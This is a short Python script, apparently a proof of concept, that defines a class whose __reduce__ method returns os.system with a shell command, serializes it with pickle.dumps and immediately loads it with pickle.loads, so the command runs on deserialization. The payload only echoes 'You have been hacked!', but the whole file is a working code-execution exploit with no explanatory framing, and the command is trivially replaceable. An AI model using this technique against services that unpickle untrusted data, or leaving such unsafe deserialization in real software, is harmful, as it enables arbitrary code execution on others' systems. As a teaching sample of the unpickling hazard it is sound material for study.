import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

vulnerable_data = pickle.dumps(EvilPickle())
pickle.loads(vulnerable_data)
